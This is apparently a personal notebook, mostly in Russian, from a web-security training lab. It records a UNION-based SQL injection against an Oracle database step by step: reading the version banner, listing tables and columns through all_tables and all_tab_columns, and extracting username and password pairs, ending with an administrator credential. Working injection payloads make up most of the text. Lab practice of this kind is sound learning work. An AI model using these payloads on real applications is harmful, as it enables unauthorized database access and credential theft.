
перечислить содержимое бд
### Listing the contents of an Oracle database

# тоже самое что и в прошлой работе но + `all_

### Перечисление содержимого базы данных Oracle

На Oracle вы можете найти ту же информацию, что и следующее:

- Вы можете перечислить таблицы, запрашивая `all_tables`:
    
    `SELECT * FROM all_tables`
    
- Вы можете перечислить столбцы, запросив `all_tab_columns`:
    
    `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

------
поехали!

🟢'union+select+banner,+null+from+v$version--     сработало!

ответ
```c
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
TNS for Linux: Version 11.2.0.2.0 - Production
```

так как оракл то  не information_chema.tables а вот так all_tables

```sql
'union+select+table_name,null+from+all_tables-- 
```

получил таблицы в том числе : 
USERS_ARHBHD
APP_USERS_AND_ROLES
SDO_PREFERRED_OPS_USER

проверю  USERS_ARHBHD

так как оракл all_tab_columns вместо information_chema.columns


```sql
'union+select+all_tab_columns,null+from+USERS_ARHBHD--  
```
ответ 500



```sql
'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ARHBHD'--  
```
ответ 200

получил столбцы

EMAIL
PASSWORD_SCQYSD
Packaway Carport
The Splash
USERNAME_BBKNVL

выводим  USERNAME_BBKNVL+||+'~+~'+||+PASSWORD_SCQYSD


'+UNION+SELECT+USERNAME_BBKNVL+||+'~+~'+||+PASSWORD_SCQYSD,+NULL+FROM+'USERS_ARHBHD'--       500  ==кавычки 'UB-D' помешали! это же не строка должна быть а название таблицы!==

```sql
'+UNION+SELECT+USERNAME_BBKNVL+||+'~+~'+||+PASSWORD_SCQYSD,+NULL+all_tab_columns+WHERE+table_name='USERS_ARHBHD'--
```
500


```sql
'+UNION+SELECT+USERNAME_BBKNVL+||+'~+~'+||+PASSWORD_SCQYSD,+NULL+all_tables+WHERE+table_name='USERS_ARHBHD'--  
```
500

🟢 получилось!
```sql
'+UNION+SELECT+USERNAME_BBKNVL+||+'~'+||+PASSWORD_SCQYSD,+NULL+FROM+USERS_ARHBHD--  
```
200
ответ

administrator~c52gyjel9mkp07j3hd3o

-----

получу только андмина пароль
```sql
'+UNION+SELECT+USERNAME_BBKNVL+||+'~'+||+PASSWORD_SCQYSD,+NULL+FROM+USERS_ARHBHD+limit+1--
```
500
==нет в оракл лимит но есть WHERE ROWNUM = 1==

🟢
```sql
'+UNION+SELECT+USERNAME_BBKNVL+||+'~'+||+PASSWORD_SCQYSD,+NULL+FROM+USERS_ARHBHD+WHERE+ROWNUM+=+1--  
```
200
ответ administrator~c52gyjel9mkp07j3hd3o


тоже только админа
```sql
'+UNION+SELECT+USERNAME_BBKNVL+||+'~'+||+PASSWORD_SCQYSD,+NULL+FROM+USERS_ARHBHD+where+USERNAME_BBKNVL='administrator'-- 
```
200
 ответ administrator~c52gyjel9mkp07j3hd3o


или так через where like:

```sql
'+UNION+SELECT+USERNAME_BBKNVL+||+'~'+||+PASSWORD_SCQYSD,+NULL+FROM+USERS_ARHBHD+where+USERNAME_BBKNVL+like+'admi%'--
```

 ответ administrator~c52gyjel9mkp07j3hd3o
сработало!






